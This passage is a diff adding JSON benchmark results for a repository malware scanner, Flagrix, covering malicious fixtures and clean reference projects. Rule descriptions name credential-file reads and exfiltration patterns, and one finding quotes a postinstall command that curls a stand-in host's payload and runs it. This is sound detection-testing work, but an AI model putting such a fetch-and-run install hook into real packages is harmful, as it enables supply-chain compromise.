@@ -1,0 +1,4587 @@
+{
+  "metadata": {
+    "benchmarkVersion": "0.1.0",
+    "runAt": "2026-07-13T19:35:54.587Z",
+    "corpusPath": "/Users/tomas.tilnak/Documents/repos/flagrix-cli/benchmark/corpus.lock.json",
+    "cliVersion": "0.1.4",
+    "engineVersion": "0.3.0",
+    "engineCommitSha": null,
+    "engineDirty": false,
+    "rulesVersion": "2026.07.12.003"
+  },
+  "metrics": {
+    "samplesDefined": 90,
+    "samplesCompleted": 90,
+    "samplesPassed": 90,
+    "criticalFixturesDetected": 10,
+    "criticalFixturesTotal": 10,
+    "criticalFixtureDetectionRate": 1,
+    "maliciousSamplesDetected": 25,
+    "maliciousSamplesTotal": 25,
+    "maliciousDetectionRate": 1,
+    "referenceSamplesTotal": 55,
+    "referenceHighVerdicts": 0,
+    "referenceHighVerdictRate": 0,
+    "referenceSamplesWithHighOrCriticalFindings": 2,
+    "referenceCriticalFindings": 0,
+    "gates": {
+      "criticalFixtures100Percent": true,
+      "maliciousDetectionAtLeast90Percent": true,
+      "zeroCriticalReferenceFindings": true,
+      "referenceHighVerdictsAtMost5Percent": true
+    }
+  },
+  "results": [
+    {
+      "sampleId": "critical-keylogger-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed behavior: keyboard capture plus network sink",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:47ddfcaf4652dcead3194f3be5f4bdc8e1b43742",
+      "expectedDetectionCategories": [
+        "EXFIL_KEYLOGGER"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "EXFIL_KEYLOGGER"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_KEYLOGGER",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Reads pressed keys from a keyboard handler and stores or transmits them"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 17,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-beavertail-loader-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Lazarus BeaverTail loader structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:cd28e14b93bd48d8fc52714787299569897f6408",
+      "expectedDetectionCategories": [
+        "BEAVERTAIL_LOADER_V1"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "BEAVERTAIL_LOADER_V1"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "BEAVERTAIL_LOADER_V1",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Matches BeaverTail malware loader pattern used by Lazarus Group in fake job interview repos"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 3,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-env-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed environment-variable exfiltration structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:11214d0e6bf271f10d443bf17c16d83232e2f297",
+      "expectedDetectionCategories": [
+        "BEAVERTAIL_EXFIL"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "BEAVERTAIL_EXFIL"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "BEAVERTAIL_EXFIL",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Environment variable exfiltration pattern — process.env dumped via fetch/axios POST"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-reverse-shell-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed reverse-shell socket structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:feff0e223beffb7e78b88ad496ff6f96c1871028",
+      "expectedDetectionCategories": [
+        "REVERSE_SHELL"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "REVERSE_SHELL"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "REVERSE_SHELL",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Socket-based reverse shell connection — creates a TCP connection back to attacker"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-crypto-miner-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed cryptocurrency-miner endpoint structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:09955ea0b3c26412934cd61e99cc25a921f8c943",
+      "expectedDetectionCategories": [
+        "CRYPTO_MINER"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "CRYPTO_MINER"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "CRYPTO_MINER",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Cryptocurrency mining code — uses CPU resources for attacker profit"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-obfuscated-eval-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Base64-decoded dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:3f60ed22624352d562b694600d87f7a37bf81fe3",
+      "expectedDetectionCategories": [
+        "OBFUSCATED_EVAL"
+      ],
+      "minimumExpectedVerdict": "medium",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4375,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "OBFUSCATED_EVAL",
+        "OBF_EVAL"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBFUSCATED_EVAL",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Base64-encoded eval execution — decodes and executes hidden payload"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-rce-endpoint-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed request-driven remote-code-execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:e4084292f92b05d88db1c0b433a74ab63e8ff3ca",
+      "expectedDetectionCategories": [
+        "BACKDOOR_RCE_ENDPOINT"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4375,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "BACKDOOR_RCE_ENDPOINT",
+        "OBF_EVAL"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "BACKDOOR_RCE_ENDPOINT",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "eval() or exec() fed from HTTP request body/query — allows attacker to run arbitrary code"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-credential-file-read-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed credential-file access structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1:895568b6b685834b3d6cf7186308ccc7f23f3cbe",
+      "expectedDetectionCategories": [
+        "FILE_ACCESS_CREDENTIALS"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "FILE_ACCESS_CREDENTIALS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "FILE_ACCESS_CREDENTIALS",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "Reads ~/.ssh/, ~/.aws/, id_rsa, or credentials files — credential theft"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-aws-key-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed AWS access-key pattern using a reserved dummy value",
+      "sourceUrl": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html",
+      "immutableRef": "fixture-v1:ab32de596974e481f402ba256ae69b9cf9ce9e76",
+      "expectedDetectionCategories": [
+        "HARDCODED_AWS_KEY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "HARDCODED_AWS_KEY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "HARDCODED_AWS_KEY",
+          "file": "src/fixture.js",
+          "line": 1,
+          "description": "AWS Access Key ID pattern (AKIA...) committed to source code"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "critical-install-script-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed install-time download and dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1:611f7347091fa4506e2f4ef8884a30fd011f7314",
+      "expectedDetectionCategories": [
+        "POSTINSTALL_SCRIPT"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "POSTINSTALL_SCRIPT"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "unspecified",
+          "type": "POSTINSTALL_SCRIPT",
+          "rule": "POSTINSTALL_SCRIPT",
+          "file": "package.json",
+          "line": null,
+          "description": "postinstall script makes network requests: \"curl https://example.invalid/payload && node -e \"e...\""
+        },
+        {
+          "severity": "critical",
+          "confidence": "unspecified",
+          "type": "POSTINSTALL_SCRIPT",
+          "rule": "POSTINSTALL_SCRIPT",
+          "file": "package.json",
+          "line": null,
+          "description": "postinstall script executes dynamic code"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fixture-keyboard-shortcut-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for ordinary keyboard UI handling",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1:0ffca52988c432109773a57e23c338551b9c51b8",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fixture-placeholder-secret-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for documented placeholder configuration",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1:d55f3f65c602eb1f695a587f61db7d635bfa1ad7",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.05,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "HARDCODED_API_KEY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "low",
+          "confidence": "high",
+          "type": "INSECURE_CONFIGURATION",
+          "rule": "HARDCODED_API_KEY",
+          "file": "app.py",
+          "line": 1,
+          "description": "Predictable placeholder secret must be replaced before deployment"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fixture-flask-debug-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control: deployment warning must not be labeled a backdoor",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1:18c530bc5c541ea2a330c43493279fc8e9686e26",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.05,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "INSECURE_CONFIGURATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "low",
+          "confidence": "high",
+          "type": "INSECURE_CONFIGURATION",
+          "rule": "INSECURE_CONFIGURATION",
+          "file": "app.py",
+          "line": 1,
+          "description": "Flask debugger is exposed on all network interfaces; disable debug mode before deployment"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fixture-detector-regex-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for security tools containing inert detector regexes",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1:977043432c1a3f3ec5c5914bcdbb96c33c6e8995",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fixture-event-stream-safe-version-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Version-bound negative control for the compromised event-stream 3.3.6 incident",
+      "sourceUrl": "https://github.com/dominictarr/event-stream",
+      "immutableRef": "package:event-stream@4.0.1:4989205f2c15c653baf5fd41bbacb8a7f6d55bad",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-express",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/expressjs/express",
+      "immutableRef": "ae6dd37680e3a00618d6c8a3e522f0ee4eeba1a4",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 151,
+      "filesSkipped": 62,
+      "treeTruncated": false,
+      "durationMs": 4066,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-fastify",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/fastify/fastify",
+      "immutableRef": "de3752df84bb8dd35a8226bb467f05862f4da57c",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.075,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "lib/config-validator.js",
+          "line": 1039,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "lib/schemas.js",
+          "line": 23,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 193,
+      "treeTruncated": false,
+      "durationMs": 3701,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-koa",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/koajs/koa",
+      "immutableRef": "52d5e8ff5ac79f2479463b53df2999900ae95115",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 84,
+      "filesSkipped": 27,
+      "treeTruncated": false,
+      "durationMs": 2878,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-axios",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/axios/axios",
+      "immutableRef": "3ebc76240c835a07fc6af23cb10d41579371a08f",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.165,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "EXFIL_COOKIE",
+        "DATA_EXFILTRATION",
+        "NETWORK_COMMUNICATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_COOKIE",
+          "file": "lib/helpers/cookies.js",
+          "line": 5,
+          "description": "Reads browser cookies via document.cookie — can steal session tokens"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "lib/axios.js",
+          "line": null,
+          "description": "Data exfiltration patterns detected: Form Data Transmission"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "lib/helpers/shouldBypassProxy.js",
+          "line": 21,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 254,
+      "treeTruncated": false,
+      "durationMs": 3433,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-lodash",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/lodash/lodash",
+      "immutableRef": "a666ba591064c8011988275790ad7d625279f09c",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.2025,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_HEX_STRINGS",
+        "EXFIL_COOKIE",
+        "OBF_BASE64_HEAVY",
+        "OBF_EVAL",
+        "OBF_NEW_FUNCTION",
+        "OBFUSCATED_CODE",
+        "NETWORK_COMMUNICATION",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "dist/lodash.js",
+          "line": 226,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "dist/lodash.min.js",
+          "line": 16,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "lodash.js",
+          "line": 226,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_COOKIE",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 5997,
+          "description": "Reads browser cookies via document.cookie — can steal session tokens"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 26455,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 489,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 15309,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 31165,
+          "description": "Extremely long line detected (42,848 characters). Malicious code may be hidden far to the right. Affected: Line 31165 (42,848 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "vendor/json-js/json2.js",
+          "line": 504,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "vendor/underscore/underscore-min.js",
+          "line": 5,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "vendor/underscore/underscore-min.js",
+          "line": 5,
+          "description": "Extremely long line detected (16,194 characters). Malicious code may be hidden far to the right. Affected: Line 5 (16,194 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "vendor/underscore/underscore.js",
+          "line": 1531,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "dist/lodash.js",
+          "line": 14567,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "lodash.js",
+          "line": 14567,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "vendor/firebug-lite/src/firebug-lite-debug.js",
+          "line": 3348,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 63,
+      "filesSkipped": 97,
+      "treeTruncated": false,
+      "durationMs": 6133,
+      "error": ""
+    },
+    {
+      "sampleId": "reference-chalk",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/chalk/chalk",
+      "immutableRef": "aa06bb5ac3f14df9fda8cfb54274dfc165ddfdef",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.15,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "TYPOSQUAT_PACKAGE"
